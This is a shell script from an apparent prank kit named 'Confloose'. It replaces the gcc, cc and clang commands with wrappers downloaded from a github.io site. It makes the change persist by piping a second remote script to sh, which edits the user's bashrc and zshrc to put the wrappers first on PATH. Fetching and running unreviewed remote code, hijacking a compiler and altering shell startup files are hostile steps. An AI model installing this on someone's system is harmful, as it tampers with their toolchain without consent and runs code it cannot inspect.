#!/bin/sh

if [ -n "${AFS_DIR:-}" ]; then
    dir="$AFS_DIR/bin"
else
    dir="$HOME/.local/bin"
fi

mkdir -p "$dir"

# Resolve the real compilers with $dir removed from PATH. On a re-apply $dir is
# already in PATH (we append it to the rc file below), so `command -v gcc` would
# return our own wrapper and GCC_PATH would point the wrapper at itself -- an
# exec loop that forks without bound the next time anyone runs gcc.
clean_path=""
old_ifs=$IFS
IFS=:
for p in $PATH; do
    [ "$p" = "$dir" ] && continue
    if [ -z "$clean_path" ]; then clean_path="$p"; else clean_path="$clean_path:$p"; fi
done
IFS=$old_ifs

for name in gcc cc clang; do
    file="$dir/$name"
    if ! real_path=$(PATH="$clean_path" command -v "$name" 2>/dev/null); then
        echo "fake-gcc: skipping $name (not installed)" >&2
        continue
    fi
    if [ "$real_path" = "$file" ]; then
        echo "fake-gcc: skipping $name (would wrap itself)" >&2
        continue
    fi
    # Keep whatever the user already had there (a ccache/cross-compile shim, ...)
    # so the antidote can put it back instead of deleting it. Never back up our
    # own wrapper: on a re-apply that would make the antidote "restore" the fake.
    if [ -e "$file" ] && [ ! -e "$file.confloose.bak" ] \
       && ! grep -q "confloose by leo \[fake-gcc\]" "$file" 2>/dev/null; then
        cp "$file" "$file.confloose.bak"
    fi
    if ! curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/fake-gcc/gcc" > "$file"; then
        echo "fake-gcc: download failed for $name" >&2
        rm -f "$file"
        [ -e "$file.confloose.bak" ] && mv "$file.confloose.bak" "$file"
        continue
    fi

    sed -i "s,GCC_PATH,$real_path,g" "$file"
    chmod +x "$file"
done

echo $(curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
